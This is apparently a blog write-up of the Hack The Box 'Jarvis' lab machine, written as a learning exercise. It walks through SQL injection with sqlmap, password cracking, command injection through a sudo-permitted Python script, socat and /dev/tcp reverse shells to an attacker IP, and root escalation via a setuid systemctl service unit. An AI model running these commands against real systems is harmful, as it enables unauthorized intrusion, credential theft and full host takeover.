---
layout: post
title:  "HTB - Jarvis"
date:   2019-09-07 20:00 +0100
tags: writeups
---
Link: https://www.hackthebox.eu/home/machines/profile/194
IP: 10.10.10.143

<!--more-->

## Recon
nmap reveals a very limited port selection:
```
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
5355/tcp  filtered llmnr
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
```

The web page on port 80 is a php site with not much at the first glance.  
On port 64999 you'll get a blank page with "Hey you have been banned for 90 seconds, don't be bad" on the first call. Interesting.  
Let's get the gobuster warmed up!

## Gobuster port 80
```
/images (Status: 301)
/index.php (Status: 200)
/nav.php (Status: 200)
/footer.php (Status: 200)
/back.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/connection.php (Status: 200)
/room.php (Status: 302)
/sass (Status: 301)
/server-status (Status: 403)
```

Huh. The site reacts weird if you play around with the Room Booking (http://10.10.10.143/room.php?cod=1) soooo... sqlmap to the rescue!


## SQLMap all ze things!

`sqlmap -u http://10.10.10.143/room.php?cod=2 --dump`

That works like a charm. So let's see if we can dump passwords from the db :3  

`sqlmap -u http://10.10.10.143/room.php?cod=2 --passwords` aaaaaaand success!  

```
[10:43:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[10:43:12] [INFO] fetching database users password hashes
[10:43:12] [INFO] used SQL query returns 1 entry
[10:43:12] [INFO] used SQL query returns 1 entry
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[10:43:18] [INFO] writing hashes to a temporary file '/tmp/sqlmapQV5_6528897/sqlmaphashes-wQNuZc.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[10:43:22] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[10:44:00] [INFO] using custom dictionary
[10:44:04] [INFO] starting dictionary-based cracking (mysql_passwd)
[10:44:04] [INFO] starting 2 processes 
[10:44:04] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                                                     
[10:45:16] [INFO] current status: nutju... -^C
[10:45:16] [WARNING] user aborted during dictionary-based attack phase (Ctrl+C was pressed)
database management system users password hashes:                                                                                                                    
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```
So with that, we could log in into the phpMyAdmin, right? But wait, sqlmap can do so much more.  
`sqlmap -u http://10.10.10.143/room.php?cod=2 --os-shell`  
aaaaand we got ourselves a shell as `www-data`. By looking around a bit, we learn that the target user is named `pepper`.  
Also, there's an interesting script in `/var/www/Admin-Utilities`, it's `simpler.py`.  
Let's get that file:  
`sqlmap -u http://10.10.10.143/room.php?cod=2 --file-read=/var/www/Admin-Utilities/simpler.py`
Looks like the script does something in the user home. I wonder if there's some sudo config that allows me to run it as user?
`sqlmap -u http://10.10.10.143/room.php?cod=2 --os-cmd="sudo -l"`  
```
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```
And we're reaching the limits of the sqlmap console, because to do something interesting with the Python script,  
we need an interactive session. So fire up a python http server and wget the `apalaxsh.php` from this dir to `www-data`.  
Fire up nc with `nc -nvlp 9999`, open your browser and point it to `/apalaxsh.php` and voila - shell.  

## Road to user
Now we can play around with the full script as user pepper:  
`sudo --user=pepper /var/www/Admin-Utilities/simpler.py`  

This [article on Infoblox Shell Escape](https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html) provides some ideas on how to escape via sudo/ping:  

```
$ sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(cat /home/pepper/user.txt)

ping: 2afa36c4f05b37b34259c93551f5c44f: Temporary failure in name resolution
```

but not only that. By upgrading the shell to a full interactive shell first (`python -c 'import pty; pty.spawn("/bin/sh")'`),  
we're able to spawn a shell as pepper:  
```
sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(/bin/bash)
$(/bin/bash)
pepper@jarvis:/$ ^^
```
This shell isn't perfectly working, so we're upgrading to a full reverse shell. Fire up nc on port 8989 and  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.195:8989`
So let's continue. 


## Road to root  
So by poking around we find that systemctl has the SETUID bit set. That means that it runs under root!  
We could pin together a systemctl oneshot service to reverse shell out as root...  
```
[Unit]
Description=Black magic happening, avert your eyes

[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c "exec 5<>/dev/tcp/10.10.15.195/8888; cat <&5 | while read line; do $line 2>&5 >&5; done"

[Install]
WantedBy=default.target
```
Then make use of systemctl link to link the service file into the correct position:  
`systemctl link /home/pepper/apalax.service`
 and enable it, therefore opening the connection to port 8888 on our Machine:  
`systemctl start --now apalax`  

The shell's ugly but it works. `cat /root/root.txt` works like a charm.